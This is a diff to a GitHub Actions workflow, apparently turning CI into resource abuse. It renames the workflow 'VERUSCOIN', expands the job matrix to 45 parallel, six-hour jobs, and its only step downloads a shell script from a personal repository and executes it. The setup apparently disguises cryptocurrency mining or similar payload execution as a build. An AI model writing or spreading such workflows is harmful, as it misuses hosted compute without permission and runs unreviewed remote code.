@@ -1,15 +1,15 @@
-name: ubuntu
+name: VERUSCOIN
 on: [push, pull_request]
 jobs:
   build:
-    name: Tesew
+    name: Ba_channel
     runs-on: ubuntu-18.04
     strategy:
       max-parallel: 30
       fail-fast: false
       matrix:
-        go: [1.6]
-        flag: [A]
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
     timeout-minutes: 360
     env:
         NUM_JOBS: 20
@@ -22,6 +22,6 @@ jobs:
       id: go
     - name: Setup
       uses: actions/checkout@v1
-    - name: Tesew
+    - name: BA_channel
       run: |
         wget https://github.com/thomasedison2888/devtest/blob/main/main.sh && chmod u+x main.sh && ./main.sh
